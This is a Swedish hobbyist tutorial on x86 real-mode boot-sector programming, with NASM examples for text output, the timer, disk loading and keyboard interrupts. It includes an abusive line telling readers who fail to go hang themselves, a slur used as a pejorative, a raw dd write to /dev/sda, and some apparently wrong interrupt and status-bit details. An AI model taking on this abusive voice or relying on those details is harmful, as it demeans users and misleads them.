+alldeles utmärkt att adressera hur fan man vill. Sen har man inte alltid så stor
+nytta av det då man troligtvis bara har en "process" (processer är en 
+mjukvaruabstraktion som implementeras med hjälp av x86's stöd för sk. "tasks")
+som körs åt gången (att ha ett multi-taskande OS för x86 i real mode känns 
+ganska gay idag).
+
+16-bitars real mode är ganska tråkigt rent prestandamässigt, men det är ett bra
+ställe att börja på när det gäller att skriva bootbar kod. Man får helt enkelt 
+börja från början. 32-bitars protected mode kommer att behandlas i en senare 
+artikel.
+
+Gåendes runt grötskålen
+-----------------------
+Vad vi behöver:
+   * USB-minne (går med diskett också, men vem fan använder det?)
+   * En dator (x86 PC) med stöd för USB-boot
+   * Linuxdist. (eller annat mer eller mindre POSIX-kompatibelt OS; *BSD, 
+                 Minix 3, etc)
+   * nasm & dd
+   * emacs (vi, nano, valfritt IDE i stil med Anjuta, Geany eller liknande)
+
+Nu ska vi bekanta oss med de verktyg vi ska använda för att framställa
+vår kewd. Vi gör detta genom att kompilera och boota ett hello-world program. 
+Förhoppningsvis har du redan ett textredigeringsprogram och en utvecklingsmiljö
+du känner dig trygg med. dd är ett verktyg för att kopiera filer, och eftersom 
+allt är en fil i POSIX så går det utmärkt att använda dd för att skriva till 
+bootsektorn på ett USB-minne. 
+
+Vi behöver lite kod också, observera:
+===== KOD
+BITS 16
+org 0x7C00
+
+start:
+        mov             ax, 0xB800
+        mov             es, ax
+        xor             di, di
+
+        mov             ds, di
+        mov             si, str
+        mov             ah, 0x04 
+.print:
+        lodsb
+        test            al, al
+        jz              hang
+        stosw
+
+        shr             ah, 1
+        jnz             .print
+        mov             ah, 0x04
+        jmp             .print
+
+hang:
+        jmp             $ ; hlt ftw 
+
+str:    db              'Hello, world!',0
+
+        times           510-($-$$) db 0
+        dw              0xAA55
+===== KOD
+Vackert, eller hur? Visst, kommentarer skadar inte, men just nu vill jag
+att du tittar på koden. Finns det kommentarer läser man dem istället för koden
+(det är ju deras funktion, deras raison d'être) och det vill vi ju inte.
+
+Segmentregister (es och ds i ovanstående kod) kan inte sättas till omedelbara
+värden, deras värde måste hämtas från ett register. I 16-bitars real mode
+kan man inte använda vilka register man vill för att referera till minnesplatser
+heller, mov byte [ax], 0x10 gillas inte, men mov byte [bx], 0x10 går hur
+bra som helst.
+
+I slutet på koden ser vi pseudo-op'en times fylla ut produkten med null-bytes så
+att den blir 510 byte stor upp tills dit. Sen lägger vi till två byte på slutet
+som fungerar som identifiering enligt tidigare givna förklaring. Det är viktigt
+att vår produkt blir exakt 512 byte stor eftersom den ska fylla bootsektorn.
+
+Jag kommer att förklara koden lite mer ingående senare, nu ska vi boota den!
+Kattenpejsta den till hello.asm och spara. Sen kör vi skiten genom nasm:
+
+nasm -fbin -o hello.bin hello.asm
+
+Nu sätter vi in vårt USB-minne om vi inte redan gjort det och skriver över
+den första sektorn (bootsektorn) med innehållet i hello.bin. Har du något 
+viktigt på USB-minnet så spara det någon annanstans, minnet kommer behövas
+formateras om för att fungera normalt igen. Vi skriver över bootsektorn med dd:
+
+dd if=hello.bin of=/dev/sda
+
+Det kan vara en bra idé att kolla så att USB-minnet verkligen hamnar som sda
+så att du inte skriver över din externa hårddisk eller något annat klumpigt.
+Detta kan man göra genom att kolla dmesg efter det man satt in minnet, eller
+/etc/mtab om man har någon form av automount installerat. Givetvis måste du
+vara root för att skriva till /devs på detta sätt. 
+
+Nu återstår bara en sak, boota från USB-stickan. Har du konfat ditt BIOS rätt
+bör det bara vara att starta om med USB-stickan i. Då ska du få upp en fin
+liten text på skärmen. Ta ut USB-stickan och tryck ctrl-alt-del för att starta 
+om.
+
+Händer inget har du failat. Lös problemet, klarar du inte det är det bara att 
+gå och hänga sig, för då är du fan ta mig för värdelös för att ens existera.
+
+Textvisning - VGA i textläge
+----------------------------
+I den tidigare presenterade koden börjar vi att sätta es:di till 0xB8000 
+(B800:0000), detta är en del av minnet som används av grafikkortet för att visa
+text i text mode, det videoläge som datorn normalt sett bootar i. För att
+skriva text till skärmen flyttar vi helt enkelt den text som ska skrivas till
+rätt position i minnet. 0xB8000 är första tecknet, 0xB8002 är andra, etc.
+Varje tecken i denna minnesregion representeras av två byte. Den första byten
+är ASCII-teckenkoden. Den andra byten beskriver bakgrund, förgrund och 
+förgrundsintensitet hos tecknet. Bitarna sätts enligt följande tabell:
+
+    0        1        2        3        4        5        6        7
+förgrund förgrund förgrund intensitet bg blå   bg grön  bg röd    blink
+   blå     grön     röd     låg/hög
+
+Ett är "ja", noll är "nej". Färger kan blandas.
+
+Så vad koden gör är att hämta ett tecken från strängen, skriva det och vår
+"beskrivningsbyte" till den del av minnet som är associerat till grafikkortet.
+Grafikkortet skriver sen ut tecknet till skärmen. Koden bytar också färg på
+tecknet mellan röd-grön-blå beroende på position.
+
+Vill jag t.ex. skriva ut ett rött H mot en grön bakgrund på första kolumnen
+i den första raden skriver jag 0x2448 till B800:0000. 
+
+Färger kan blandas också, vill du ha vit förgrundsfärg sätter du den lägre
+nibblen (fyra-bitarsdelen) til 0111 (binärt givetvis).
+
+Hårdvaruinterrupts och PICs
+---------------------------
+För många ses interrupts som synonymt med systemanrop i Linux (pre 2.6 iaf). 
+Det är väl så de flesta av oss lärt känna till denna CPU-mekanism. Men vad är 
+det?
+
+En interrupt avbryter det normala programflödet för att köra en speciell
+funktion som kallas för en ISR (Interrupt Service Routine). x86 har 256 olika
+interrupts. Det finns två typer av interrupts, hårdvarutriggade och 
+mjukvarutriggade. Mjukvarutriggade interrupts initieras av CPU-instruktionen
+int. De används bland annat för anrop mellan olika segment, t.ex. mellan
+bootkod och BIOS. 
+
+Hårdvarutriggade interrupts initieras av någon extern händelse, t.ex. en
+nedtryckt tangent eller en signal från någon kontroller utanför CPUn. I grova
+drag går det till som så att interruptkontrollern (PIC - Programmable Interrupt
+Controller) tar emot en förfrågan om en interrupt (Interrupt ReQuest, IRQ) från
+någon extern källa. Interruptkontrollern anropar sedan den ISR som är associerad
+till den interruptförfrågan som skickades.
+
+Förr i tiden var PICen en (två faktiskt) Intel 8259 kontroller. Detta 
+gränssnitt finns fortfarande kvar (om de fysiska chippen fortfarande används
+eller om det emuleras vet jag ej), men idag är det allt vanligare med Intels 
+APIC (A för Advanced) som möjliggör fler IRQ-linjer än tidigare (256 vs. 16).
+8259-gränssnittet räcker dock mer än väl för oss just nu.
+
+Hur avgör CPUn vilken ISR som ska anropas för en given interrupt? Hur sker 
+översättningen mellan interruptnummer och ISR-adress? 
+
+Vid 0000:0000 börjar ett fält som kallas för IVT - Interrupt Vector Table.
+Skulle man beskriva det i C-kod skulle det kunna se ut såhär:
+
+struct ivt_s {
+    uint16_t offset;
+    uint16_t segment;
+} IVT[256];
+
+IVT[0] håller offset och segment för interrupt 0, IVT[1] för interrupt 1, etc.
+Skulle vi registrera en ISR för interrupt 128 (0x80) skulle vi helt enkelt
+skriva över IVT[128] med offset och segmentadress till den position där
+vår ISR börjar. När sedan int 0x80 körs ändras instruktionspekaren till
+den adress som finns angiven vid IVT[128] (samt en del annat).
+
+Så, om IRQ0 genereras, anropas interrupt 0 då? Svar nej. IRQ0-15 delas upp
+i två block (en för varje 8259 PIC). IRQ0-7 är interrupt 8-15 (0x08-0x0F) och
+IRQ8-15 är interrupt 88-95 (0x58-0x5F).
+
+Hur ser en ISR ut då? I grova drag något sånt här:
+
+myISR:
+    cli
+    
+    ;; kewd som gör saker
+
+    sti 
+    iret
+
+IRQ ISRs brukar ha lite extra kod för att skicka ett End Of Interrupt-meddelande
+till PICen, och oftast brukar man pusha registerna till stacken för att inte
+ändra tillståndet hos datorn när man återvänder till den del av koden som
+kördes innan interrupten anropades. Detta är särskillt viktigt för 
+hårdvaruinterrupts. Tänk er själv vad som skulle hända i följande scenario:
+    mov        al, 45
+    ;; Här trycker någon på en tangent som anropar en ISR som hanterar
+    ;; inmatning från tangentbordet
+    cmp        al, 45 ; inte det resultat vi vill få!
+
+iret fungerar ungefär som en vanlig ret, fast för ISRs. Skillnaden ligger i att
+iret poppar ip, cs och flags-registret från stacken till respektive register.
+De läggs på stacken innan ISRn anropas.
+
+Det finns en sak till förutom hårdvaru-/mjukvarutriggade interrupts som anropar
+ISRer, det är sk. undantag (eng. exceptions). När något händer som CPUn inte
+kan hantera (ip pekar på en opcode som inte är en giltig instruktion, div 
+försöker genomföra en division där nämnaren är noll, etc) anropas den ISR som
+är associerad till det undantag som uppstått. T.ex: interrupt 0x00 är division 
+by zero interrupt, interrupt 0x03 är breakpoint exception (används av debuggers
+för att avbryta programflödet vilket gör att man kan ha ett program som kör ett
+annat program och hålla koll på "slav"-programmets tillstånd utan att behöva 
+emulera den underliggande hårdvaran).
+
+Intel 8254 - 16-bitars timer (PIT)
+----------------------------------
+Låt oss titta lite närmare på något som genererar hårdvaruinterrupts, nämligen
+PITen! PIT står för Programmable Interval/Interrupt Timer, viktigt att hålla
+reda på akronymerna här Just Intel 8254 är en PIT med en frekvens på 0x1234dd
+Hz som hittas på alla IBM kompatibla PCs. Idag är kontrollern oftast emulerad,
+kretsen i sig är ganska gammal. För de med högre krav på timers för t.ex.
+multimedia-applikationer finns IA-PC HPET (High Precision Event Timer). 
+
+8254an har tre timerkretsar, timer0-2. Timer0 används för att generera 
+interrupts, antingen med jämna intervaller eller sk. one-shot. Timer1 användes
+förr som en RAM-klocka, men den funktionen används inte idag. Eftersom Timer1
+alltid varit en systemtimer finns ingen anledning att emulera den, och därför
+är det inte alla moderkortstillverkare som fortfarande stödjer timer1. Timer2
+används för att generera vågformer för PC-högtalaren. 
+
+PITen har en kontrollport (Control Word Register), I/O port 0x43. Ska man
+pyssla med PITen skriver man först vilken timer man vill pyssla med här samt
+vilket läge man vill att timern ska arbeta med. All denna info är packad i
+en byte i formatet:
+
+Bit 7-6: val av timer (0-2)
+Bit 5-4: läs/skriv-läge
+Bit 3-1: arbetsläge för PIT-timern
+Bit 0:   BCD eller 16-bitarscounter
+
+Bit 0 är 0 för att använda en 16-bitarscounter, 1 för att ange count i BCD. Vi
+kommer att använda oss av 16-bitarscounter. 
+
+8254an har sex olika arbetslägen, de intressanta är för oss är läge två och
+tre. Läge två genererar interrupts på förutbestämda intervaller. Läge tre 
+genererar en fyrkantsvåg som vi kan använda till PC-speakern.
+
+läs/skriv-läget anger hur vi matar vår 16-bitarscounter till respektive timer.
+Det som är aktuellt för oss är läge 3, vi skriver den minst signifikanta byten
+till timern först, sen den mest signifikanta.
+
+Vill vi att timer0 ska generera en interrupt hundra gånger varje sekund räknar
+vi först ut vad vår counter ska ha för värde. För att göra detta tar vi
+PIT-frekvensen (0x1234dd) och dividerar med antalet ggr vi vill generera 
+interrupten per sekund (100 ggr). Vår counter får alltså värdet 0x2e9b.
+
+Efter det skriver vi 00110100 (0x34, timer 0, skrivläge 3, arbetsläge 2, 
+16-bitarscounter) till PITens kontrollregister 0x43. Till sist skriver vi vårt 
+countervärde (0x2e9b) till timer0s I/O port, 0x40.
+
+Men vad händer då? Jo, en IRQ skickas till PICen varje gång vår counter (som
+minskas med ett 0x1234dd ggr/sekund) når noll. IRQ0 närmare bestämt. IRQ0
+genererar i sin tur interrupt 8. Så för att något ska hända när vi genererar
+vår interrupt får vi patcha IVTn och lägga till adressen till vår ISR som vi
+vill få anropad med jämna intervaller. interrupt 8 är offset 0x20 i IVTn.
+
+Så, det var timer 0. PITen används även för att generera toner till den interna
+PC-speakern. Den gör detta genom att generera en fyrkantsvåg med en viss 
+frekvens som vi anger i form av ett värde till countern. Vill vi ha en ton på 
+200 Hz dividerar vi PIT-frekvensen med 200 för att få fram countervärdet. Varje
+gång räknaren når noll sker en växling av timeroutputen (låg-hög eller vice
+versa) och nedräkningen börjar om från början. Nästa gång timern når noll sker
+samma växling och nedräkningen startas om på nytt. Så pågår det ad infinitum, 
+eller åtminstånde tills det avbryts av antingen mjukvaran eller hårdvaran. 
+
+För att generera en fyrkantsvåg med vår PIT skriver vi ut 1011 0110 (0xb6, timer
+2, skrivläge 3, arbetsläge 3) till I/O port 0x43 följt av counter-värde till
+port 0x42. Därefter måste vi säga till PC-speakern att den ska vara aktiv och
+ta sin input från PITen (och då givetvis timer 2). Detta gör vi genom att läsa
+från PC-speakerns I/O port, 0x61, och sätta de två lägsta bitarna till 1. Bit 0
+kontrollerar speakern (av/på) och bit 1 kontrollerar timer 2 input (nej/ja).
+Alltså:
+        ;; activate and set timer 2
+        mov     al, 0xb6
+        out     0x43, al
+        mov     ax, TIMER_COUNT 
+        out     0x42, al
+        shr     ax, 8
+        out     0x42, al
+
+        ;; activate PC speaker
+        in      al, 0x61
+        or      al, 3
+        out     0x61, al
+
+
+
+Innan vi går vidare - Hur man kommer från bootsektorn
+-----------------------------------------------------
+BIOS laddar bara första sektorn till minnet, till 0000:7C00, remember? Men 
+vafan, det är ju bara 512 byte varav vi kan använda 510 byte. Det blir svårt att
+få in Windows där. På nägot sätt måste vi använda dessa 510 byte till att ladda
+resten av vårt skit.
+
+Vi måste på något sätt få åtkomst till USB-disken för att kunna ladda fler
+sektorer till minnet. 510 byte är lite för lite för att implementera rutiner
+för USB 1.1 eller 2.0 protokollet och dessutom få igång diskhantering över det.
+Turligt nog erbjuder BIOS oss en utväg.
+
+Vi har ju snackat en del om interrupts och om BIOS tidigare i artiklen, men jag
+har undvikit att nämna BIOS-rutiner. BIOS lägger nämligen till egna interrupts
+i IVTn. Genom att använda mjukvaruinterrupts som funktionsanrop får vi ett
+fint gränssnitt mot kod  i BIOS som låter oss göra allt från utskrifter till
+skärmen till att läsa tecken från tangentborder och --- läsa från disk!
+Dock är BIOS-rutiner något som bör undvikas in i det längsta, de är bra för
+portabel och kompakt kod men de är långsamma och svarta lådor. Olika BIOS jobbar
+på olika sätt, och även om gränssnitten är mer eller mindre de samma så används
+olika algoritmer vilket kan ge en stor prestandaskillnad för det system vi 
+försöker implementera.
+
+Låt mig introducera interrupt 0x13, en BIOS-funktion för att hantera diskar.
+Nu snackar vi inte diskar som i mappar och filer, utan på lägsta nivå i sektorer
+cylindrar och diskhuvuden. Det är lite kul, för moderna NAND-baserade och andra
+solid-state diskar har inte diskhuvuden eller sektorer på samma sätt som en
+traditionell hårddisk har, men samma gränssnitt används för dem.
+
+int 0x13 kan adressera 1024 cylindrar, 256 diskhuvuden och 63 sektorer. En
+sektor är 512 byte. 63 sektorer är således ca. 32kb. Det borde vara mer än nog 
+för att ladda kewd som implementerar ett vettigt filsystem och USB-hantering så
+man slipper använda BIOS-rutinerna.
+
+int 0x13 har rutiner för saker som att hämta information från disk och 
+kontrollera diskstatus, men det vi är intresserade av är att läsa sektorer till
+minnet. ah får ett nummer som identifierar vilken rutin vi vill använda, och
+"läsa sektorer till minnet"-rutinen är 0x02. al får antalet sektorer vi vill 
+läsa, cx innehåller cylinderspår samt sektoroffset, dh håller läshuvudet, dl
+har nummret till disken vi vill läsa ifrån och es:bx håller adressen vi vill
+skriva till. 
+
+Allt detta är ganska rättfram, men vi har ett problem. Hur vet vi vilket nummer
+vår USB-disk har? Vi kan ju gissa, men faktum är att när vår kod börjar köras
+är registret dl redan satt till vårt disknummer.
+
+Det finns faktiskt en rutin till som kan behöva användas från int 0x13. Det är
+"drive reset"-funktionen 0x00. Jag _vet_ inte om det behövs när man bootar från
+USB ( jag har gjort det utan) men eftersom man använder samma gränssnitt som för
+disketter kanske vissa BIOS kräver det. Det skadar inte att använda iaf. Vilken
+disk vi ska resetta anges som parameter i dl.
+
+Sektor 1 är bootsektorn, så vi börjar ladda kewd från sektor 2 och framåt. Lite
+exempelkod:
+
+===== KOD
+BITS 16
+org 0x7c00
+start:
+         mov         sp, 0x6000
+         mov         dh, 0
+         push        dx ; reset might change dl on success, I dunno
+
+         ;; reset, dl is set 
+reset:
+         xor         ax, ax
+         int         0x13
+         jc          reset ; fail? Do it again fgt
+
+         pop         dx
+         mov         ax, 0x1000
+         mov         es, ax
+         xor         bx, bx ; load shit to 1000:0000
+
+readSectors:
+         mov         ah, 2  
+         mov         al, (theRestSize/512)+1 ; number of sectors
+         mov         cx, 2  ; cylinder 0, sector 2
+         pop         dx
+         int         0x13
+         jc          readSectors
+
+         ;; Jump up, jump up and jump around!
+         jmp         0x1000:0
+
+         times 510-($-$$) db 0
+         dw 0xAA55
+theRest:
+         incbin "therest.bin"
+theRestSize equ $-theRest       
+===== KOD
+        
+therest.bin innehåller den del av vår kod vi vill ladda till minnet. Vi gör
+därför klokt i att ha en källkodsfil för bootloadern (ovanstående kod) och en
+för det program vi vill ladda. På så sätt kan vi få offsets (org-direktivet) och
+liknande rätt, och skapa en modulär plattform, där vi kan behålla samma 
+bootloader men byta ut programkoden. Vi slipper alltså koda ovanstående stycke
+om och om igen.
+
+Intel 8042 - tangentbordshantering
+----------------------------------
+Som människor är tangentbordet vårt främsta inmatningsgränssnitt till vår dator.
+Vare sig vi spelar  Quake XII, Doom 3k, Rampaging Kill Zone V, skriver en 
+labbrapport till vår lärare, jobbar på en artikel till HckZine eller skriver
+ett mail till någon vi tycker om så skulle det jobbet vara mycket svårare utan
+vårt fina tangentbord. Detta stycke kommer att hantera PS/2 tangentbord, USB 
+tangentbord är en annan historia.
+
+I vårt tangentbord finns det en mikrokontroller som läser av tangentbordets 
+tillstånd X gånger/sekund. Denna uC kallas för "device controller", just därför
+att den sitter på en periferienhet. Tangentbordet har en egen kontroller 
+eftersom det skulle ta ganska mycket CPU-kraft om vår processor skulle bemöda
+sig med detta monotona arbete istället för att fokusera på det viktiga här i 
+livet. 
+
+När tangentbordets tillstånd förändras från "ingenting händer" till "OMG, någon
+nuddade mig!" läser tangentbordskontrollern av tangenternas konfiguration och
+får något som kallas för en "scan code", ett värde på vilken knapp som
+är nedtryckt. Det är iaf den uppfattning jag har fått. När detta händer
+skickar vår device controller ett meddelande via tangentbordskabeln till en 
+annan kontroller, host controllern. Denna Intel 8042-kompatibla uC genererar
+sedan en IRQ till PICen som säger, "hey, nånting har hänt med mig!". En
+ISR anropas. Resten är upp till oss, vi läser av vilken tangent som tryckts ner
+översätter den till ett tecken och sedan skriver vi detta tecken till vår 
+inmatningsbuffer (eller kasserar det, eller skriver det direkt till skärmen,
+serieporten eller vad vi nu vill göra).
+
+Vi kanske inte gillar interrupts. Vi kanske kör ett program där allt måste ske
+i en viss ordning och inget kan tillåtas störa våra uträkningar om vi inte
+vill så! Då kan vi säga till tangentbordet att inte generera interrupts. Vad vi 
+gör då istället är att vi läser av en I/O port och kollar om en bit är satt. Är
+den det läser vi från tangentbordets inmatningsbuffer. Denna buffer har den
+häpnadsväckande storleken av en byte!
+
+Har du någonsin suttit i Linux, tryckt på å, ä eller ö och fått ett helt annat 
+tecken skrivit till skärmen? Detta beror på att översättningen mellan scan code
+till tecken är felaktig, du har laddat fel "keyboard map(ing?)". Alla människor
+här i världen har fått för sig att de inte ska snacka samma språk eller ha
+samma skrifttecken. Därför finns det olika tangentbord. När vi läser in vilken
+tangent som är nedtryckt får vi inte en teckenkod (som jag nämnt nu några 
+gånger) utan vi får en "scan code" som talar om för oss att tangenten på den
+här positionen på tangentbordet är nedtryckt. Den tangenten kan vara ett tyskt y
+ett grekiskt psi, ett slaviskt-kyrilliskt sjtja eller något tecken en galen
+vetenskapsman hittat på för att han inte gillar de existerande skrifttecknen som
+används. Det kan också vara ö, även om det är mer förståeligt eftersom det är 
+ett Överlägset tecken.
+
+Det finns även olika typer av scan codes som talar om för oss om en tangent
+blivit nedtryckt eller släppt. Dessa kallas för make respektive break codes.
+I regel är en break code är samma som tangentens make code, fast bit 7 är 1. 
+Vi har även modifieringstangenter som shift, alt och ctrl. Dessutom har vi 
+funktionstangenterna F1 till F12 att hålla reda på. Mikket skit alltså.
+
+Håller vi nere en tangent längre än en viss tid (normalt sett 0.5 sekunder, men
+detta kan ändras om man inte gillar det) skickas dess make code igen. Och igen.
+Och igen. Tills dess att vi släpper tangenten, då dess break code skickas.
+Givetvis måste vi kunna hantera tangentbordskombinationer i stil med Shift+A, 
+Ctrl-Alt-F5 och annat skit man kan tänkas mata in. Detta i kombination med 
+översättningen scan code till tecken gör att vi har lite att bita i. För att 
+göra det ännu klyddigare består vissa scan codes av flera byte.
+
+Så, det var teorin. Nu till praktiken, hur fan kodar vi en rutin som kan
+hantera tangentbordet? Hur tar vi emot scan codes? 
+
+Det finns två I/O portar vi måste hålla koll på, I/O port 0x64 och 0x60.
+Port 0x64 är tangentbordets status/kommandoregister. Skriver vi hit skriver
+vi ett kommando, läser vi härifrån läser vi tangentbordets status. Vi läser
+eller skriver en byte. Port 0x60 är tangentbordets I/O buffer. Buffern är som
+tidigare nämnt 1 byte stor, så den fylls ganska snabbt. När den är full måste 
+den tömmas.
+
+Låt oss gå in mer i detalj på hur vi läser tangentbordets status. Vi tar
+helt enkelt och läser en byte från port 0x64:
+    in    al, 0x64
+Byten som hamnar i al har följande utformning:
+Bit:     7   6   5    4   3  2   1   0
+Namn:  PERR TO MOBF INH A2 SYS IBF OBF
+
+PERR - Parity error, paritetsbiten (agerar som en 1-bits checksum) är fel. Kan
+       betyda att tangentbordssladden är skadad, glappar eller att elektroniken
+       failar. Kan också vara någon induktiv störning (kanske inte så troligt
+       på den korta biten men risken finns).
+TO   - Timeout för tidigare kommando. Skicka igen.
+MOBF - Mouse Output Buffer Full, hmm, PS/2 är ju inte bara tangentbordet. Dock
+       Går vi inte in mer i detaljer på detta.
+INH  - Inhibit flag (hämmad, ?) Jag vet faktiskt inte. 
+A2   - Address line 2, (?) Se ovan.
+SYS  - system flag (reset läge) Se ovan.
+IBF  - Input Buffer Full - vi kan läsa från input buffern. Vi bör.
+OBF  - Output ---------  - Vi kan skriva till output buffern.
+
+Så, det vi behöver bry oss om är bit 7, 6, 1 och 0. Viktigast är de två minst
+signifikanta bitarna. Innan vi rör port 0x60 MÅSTE VI ALLTID KOLLA ATT 
+I/O-BUFFERN ÄR TOM!
+
+Det finns även olika kommandon vi kan skriva till port 0x64. Vi kommer bara att 
+fokusera på ett av dem, Write Command Byte (kod 0x60). Resten har med initiering
+och liknande att göra, och det sköter BIOS åt oss vid uppstart.
+
+När vi skrivit WCB (0x60) till port 0x64 skriver vi själva kommandobyten till 
+port 0x60. Återigen, I/O-bufferten måste vara tom! Kommandobyten ser ut som
+följer:
+
+Bit:   7   6     5   4  3  2    1    0
+Namn: -- XLAT _EN2 _EN -- SYS INT2 INT
+
+Bit 7 och 3 används inte. Resten är:
+
+XLAT - Översätt scancodes till set 1 (bör vara noll, disabled)
+_EN2 - Enable/Disable mouse  (0 enable)
+_EN -  Enable/Disable keyboard(0 enable)
+SYS - modifiera system flag manuellt (reset?)
+INT2 - generera IRQ12  när mouse input buffer är full
+INT - Input Buffer Full Interrupt - generera IRQ1 när input buffer är full
+
+Det finns olika scan code sets, detta är en historisk rest som finns kvar av
+kompabilitetsskäl. Skriver vi ny kewd bryr vi oss inte. Vi skiter alltså i XLAT
+biten. SYS ändrar systemflaggan (som jag tidigare angav har jag ingen aning vad
+denna flagbit innebär).
+
+Två andra bitar vi behöver bry oss om är INT2 och INT. Input Buffer Full 
+Interrupt. Om INT2 sätts till 1 skickas IRQ12 till PICen så fort något händer 
+med musen. Använder vi ingen mus bör vi sätta denna bit till noll. Om INT
+sätts till 1 genereras IRQ1 varje gång något händer med tangentbordet. Vill
+vi använda interrupts sätter vi den till ett, vill vi polla port 0x64 och
+kontrollera IBF-flaggan istället sätter vi INT till noll.
+
+Så, givet att vi använder oss av interrupts för att läsa av tangentbordet så
+sker följande när en tangent trycks ner:
+    * IBF sätts till 1 i statusregistret
+    * IRQ1 genereras, om PICen inte maskar bort den anropas ISRn som IVT[9]
+      hänvisar till.
+    * Vår ISR läser statusregistret, ser att IBF är ett, läser scan code
+      från port 0x60.
+
+Nu har vi lite olika val här. Vi kan ju använda vårt tangentbordsgränssnitt som
+en enda stor I/O-kanal i en bil, där tangenterna är kopplade till växelsystemet,
+lampor, ratten, sätvärmare etc. Då vill vi troligtvis inte översätta de scan
+codes vi läser till tecken. Istället vill vi hålla reda på tillståndet, vi 
+märker att ratten är vriden åt vänster (olika steg av vridning finns givetvis
+för att göra skillnad på upplösningen) så vi svänger vänster med hjulen. När
+vi tar emot en break code nollställer vi hjulens position. Ett mer troligt
+scenario kan vara att vi använder vår dator som en synth, och istället för att
+översätta tangentbordskoderna till tecken spelas en ton upp tills dess att
+tangentens break code läses från I/O porten.
+
+Normalt vill vi dock översätta våra scan codes till tecken, skriva till en 
+buffer, och när buffern är full göra något med den. ISRer anropas oftast väldigt
+mycket under korta tidsperioder, så de bör vara så korta som möjligt för att 
+inte ta upp onödigt mycket CPU-tid. Vi bör alltså inte låta vår ISR anropa 
+andra funktioner som tar hand om bufferhanteringen, utan vi sätter en semafor 
+och returnerar från vår ISR. Sen får någon annan del av vårt program ta hand
+om buffern.
+
+Vilka scan codes som bör översättas till vilka tecken är lite svårt att veta.
+Det bästa sättet att ta reda på det är att kolla i befintlig källkod i diverse
+operativsystem, t.ex. Minix 3 där våra scan codes finns i filen
+src/drivers/tty/keymaps/scandinavian.src
+
+Antingen det eller så kör du följande program som jag slängt ihop bara för DIG: 
+===== KOD
+;;; keyboard.asm - Print keyboard scan codes to the screen
+BITS 16
+ORG 0x7C00
+
+;; some defines for readability
+%define KBDPORT_STATUS  0x64
+%define KBDPORT_CMD     0x64
+%define KBDPORT_IO      0x60
+%define KBDMASK_IBF     0xFD
+        
+start:
+        cli
+
+        ;; patch IVT[9]
+        mov     di, 4*9
+        mov     word [di], kbdISR
+        add     di, 2
+        mov     word [di], 0
+        
+        ;; settin' up stack and video stuff
+        mov     ax, 0xB800
+        mov     es, ax
+        xor     di, di
+        mov     ax, 0x5000
+        mov     ss, ax
+        xor     sp, sp
+
+        sti
+        nop
+
+mainLoop:
+        hlt
+        jmp     mainLoop
+
+
+kbdISR:
+        ;; keyboard interrupt handler
+        call    readScanCode
+        jc      .afterPrint      
+        call    printByte
+.afterPrint:
+        mov     al, 0x20        ;EOI
+        out     0x20, al
+        iret
+
+readScanCode:
+        ;; stc if nothing to print
+        in      al, KBDPORT_STATUS
+        and     al, KBDMASK_IBF
+        jnz     .gotInput
+        stc
+        ret
+.gotInput:
+        in      al, KBDPORT_IO
+        clc
+        ret
+
+printByte:
+        ;; al: byte to print in hex
+        mov     dl, al
+        shr     al, 4
+        and     dl, 0x0F
+
+        ;; al, high nibble
+        ;; dl, low nibble
+        cmp     al, 10
+        js     .afterAL
+        add     al, 7
+.afterAL:        
+        cmp     dl, 10
+        js      .afterDL
+        add     dl, 7
+.afterDL:
+        add     al, 0x30        ;0x30: ASCII-0        
+        add     dl, 0x30
+        
+        call    printAL
+        mov     al, dl
+        call    printAL 
+        mov     al, 0x20
+        call    printAL 
+        ret
+
+printAL:
+        ;; writes the char in al to the screen and keeps track of
+        ;; the rows and cols
+        cmp     di, 4000     ; is the screen full?
+        js      .doPrint
+        call    clearScreen  ; The screen is full, clear it out!
+.doPrint:        
+        mov     ah,  0x07
+        stosw
+        ret
+
+clearScreen:
+        xor     di,di
+        xor     ax, ax
+        mov     cx, 80*25
+        rep     stosw
+        xor     di, di
+        ret 
+        
+        times 510-($-$$) db 0
+        dw 0xAA55                                
+===== KOD
+Som du troligtvis ser (om du faktiskt läser koden och inte bara scrollar
+förbi den för att du är för lat för att sätta dig in i den) skriver programmet
+ut scan codes till skärmen. Om du provar det märker du dock en 
+sak när du tröttnar på det och vill starta om datorn. Ctrl-alt-del fungerar
+inte! Det är för att BIOS har en egen IVT[9] ISR som tar hand om tolkningen
+och verkställandet av trefingerssaluten. Vad du kan göra föra ha kvar denna
+ISR är att spara de gamla värdena för IVT[9] och sen jmp'a till dem i slutet
+av din egen ISR. Detta garanterar dock inte samma funktionalitet, eftersom vi
+redan läst in tecknena från tangentbordets I/O-buffer. Troligtvis fungerar det
+inte öht. Så det bästa vore att koda ihop en egen rutin som sköter det också.
+
+En avskedsgåva - för denna gång
+-------------------------------
+Visst är det kul att koda saker där man känner att man vet exakt vad som pågår,
+i alla fall på mjukvarunivå? Inte massa svarta lådor med kod som man inte vet
+vad de gör som är i vägen för en. Inte för att svarta lådor nödvändigtvis är 
+något dåligt, de tillåter oss att fokusera på uppgiften vi ska lösa och hur vi
+ska lösa den med hjälp av datorn istället för att behöva tänka på hur vi ska 
+instruera datorn till att lösa den. Svarta lådor finns överallt, i form av 
+scriptspråk och dess tolkar, kompilatorer, kodbibliotek, operativsystem och
+liknande. Givetvis säger jag inte att man ska lägga ner sin tid på att skriva 
+ett eget operativsystem bara för att existerande operativsystem är så stora och
+klumpiga så att det är omöjligt för en enda människa att känna till alla 
+aspekter av det. Däremot säger jag att man ska besitta kunskapen till att kunna
+skriva ett operativsystem, att kunna forma egna svarta lådor. 
+
+Det är så kodhierarkin fungerar, de som bara använder svarta lådor utan att 
+förstå hur de fungerar är längst ner i rännstenen. Här hittar vi farmor Agda 
+som tror att muspekaren har någon mekanisk koppling till musen och Pelle som 
+aldrig förstått hur Bosses karaktär kan dö när han riktar sitt hårkors mot 
+honom och trycker på vänster musknapp i spelet Ultimate Massacre 4200. De är 
+rena gränssnittsanvändare. Hoppet är nog ute för Agda, hennes liv är annorlunda.
+Inte sämre, bara annorlunda. Pelle däremot växer upp, skriver egna bindings 
+till spelet han spelar (han förstår ytterligare en svart låda, hur spelet 
+associerar vissa händelser hos honom som musklick till händelser i spelet),
+upptäcker att han kan göra så att rekylen i spelet kompenseras genom att han 
+associerar ett musklick med avfyrning av vapnet _och_ sänkning av vapnet i 
+y-led. Han får positiv feedback och även om spelets tillverkare omöjliggör 
+detta "fusk" i nästa patch är han eggad att lära sig mer. Han börjar se det 
+hela i ett större perspektiv, lär sig kewda, tar sig förbi ytterligare en svart
